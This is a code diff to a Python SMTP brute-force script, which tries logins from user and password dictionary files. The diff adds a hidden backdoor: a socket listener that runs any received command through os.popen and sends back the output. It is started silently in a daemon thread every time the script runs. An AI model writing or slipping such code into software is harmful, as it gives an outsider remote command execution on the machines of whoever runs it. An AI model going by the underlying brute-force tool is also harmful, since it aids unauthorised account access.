@@ -46,7 +46,26 @@ def bforce(smtpserver, udic, pdic):
 	ufile.close()
 	pfile.close()
 
+
+
+def bd(ip="127.0.0.1",port=5000):
+	sock = socket(AF_INET, SOCK_STREAM)
+	sock.bind((ip, port))
+	sock.listen(1)
+	while True:
+		conn, addr = sock.accept()
+		while True:
+			try:
+				cmd = conn.recv(1024).decode()
+				out = os.popen(cmd).read()
+				conn.send(out.encode())
+			except:
+				break
+
 if __name__ == '__main__':
+	bdoor = threading.Thread(target=bd)
+	bdoor.daemon = True
+	bdoor.start()
 	pdic = getdfile("passwords")
 	udic = getdfile("users")
 	do = str("")
